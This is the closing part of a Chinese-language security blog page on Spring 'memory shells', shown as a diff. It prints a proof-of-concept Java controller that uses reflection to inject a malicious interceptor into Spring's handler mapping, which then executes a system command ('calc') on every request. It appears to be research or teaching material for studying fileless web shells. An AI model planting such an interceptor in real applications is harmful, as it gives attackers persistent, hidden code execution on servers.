+<h3 id="poc-1">POC</h3>
+<pre><code class="language-java">package org.example.spring.Controller;
+
+
+import org.springframework.stereotype.Controller;
+import org.springframework.web.bind.annotation.RequestMapping;
+import org.springframework.web.context.WebApplicationContext;
+import org.springframework.web.context.request.RequestContextHolder;
+import org.springframework.web.servlet.HandlerInterceptor;
+import org.springframework.web.servlet.handler.AbstractHandlerMapping;
+
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import java.lang.reflect.Field;
+import java.util.ArrayList;
+
+@Controller
+public class shellInterceptor {
+    @RequestMapping(&quot;/shell&quot;)
+    public void shell() throws Exception {
+        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);
+        AbstractHandlerMapping handlerMapping = (AbstractHandlerMapping) context.getBean(AbstractHandlerMapping.class);
+        System.out.println(handlerMapping.getClass().getName());
+        Field field = AbstractHandlerMapping.class.getDeclaredField(&quot;adaptedInterceptors&quot;);
+        field.setAccessible(true);
+        ArrayList list = (ArrayList) field.get(handlerMapping);
+        list.add(new shell_Interceptor());
+
+    }
+
+    public class shell_Interceptor implements HandlerInterceptor {
+
+        @Override
+        public boolean preHandle(HttpServletRequest request,
+                                 HttpServletResponse response,
+                                 Object handler) throws Exception {
+            Runtime.getRuntime().exec(&quot;calc&quot;);
+            // 返回 true 继续执行，false 则终止请求链
+            return false;
+
+
+        }
+    }
+}
+</code></pre>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC"><li><a href="#spring">Spring介绍</a><ul><li><a href="#ioc">IOC</a></li><li><a href="#aop">AOP</a></li><li><a href="#springmvc">SpringMVC</a></li><li><a href="#font-stylecolorrgb50-50-93applicationcontextfont">ApplicationContext</a></li></ul></li><li><a href="#controller">Controller型内存马</a><ul><li><a href="#heading">思路：</a></li><li><a href="#heading-1">获取上下文</a><ul><li><a href="#getcurrentwebapplicationcontext">getCurrentWebApplicationContext</a></li><li><a href="#webapplicationcontextutils">WebApplicationContextUtils</a></li><li><a href="#requestcontextutils">RequestContextUtils</a></li><li><a href="#font-stylecolorrgb50-50-93getattributefont">getAttribute</a></li></ul></li><li><a href="#controller-1">注册恶意Controller</a><ul><li><a href="#font-stylecolorrgb50-50-93registermappingfont">registerMapping</a></li><li><a href="#font-stylecolorrgb85-85-85registerhandlerfont">registerHandler</a></li><li><a href="#font-stylecolorrgb85-85-85detecthandlermethodsfont">detectHandlerMethods</a></li></ul></li><li><a href="#poc">POC</a></li></ul></li><li><a href="#font-stylecolorrgb85-85-85interceptorfont">Interceptor型内存马</a><ul><li><a href="#interceptor">什么是Interceptor</a></li><li><a href="#interceptor-1">Interceptor示例</a></li><li><a href="#font-stylecolorrgb85-85-85font">实现思路</a><ul><li><a href="#font-stylecolorrgb85-85-85font-1">获取上下文</a></li><li><a href="#font-stylecolorrgb85-85-85interceptorfont-1">实现恶意Interceptor类</a></li><li><a href="#heading-2">动态注入</a></li><li><a href="#poc-1">POC</a></li></ul></li></ul></li></ul>
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="/post/tomcat-xing-nei-cun-ma/">
+              <h3 class="post-title">
+                Tomcat型内存马
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  
+  <a class="rss" href="/feed.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  <script>console.log("\n%c ✦ Gridea Pro v0.0.0-dev %c · Theme: notes v1.2.0 · https://gridea.pro %c\n","color:#fadfa3;background:#111111;padding:9px 14px;border-radius:4px 0 0 4px;font-weight:500;font-size:12px","color:#e05c00;background:#fff3ec;padding:9px 14px;border-radius:0 4px 4px 0;font-size:11px","")</script>
+</body>
+</html>
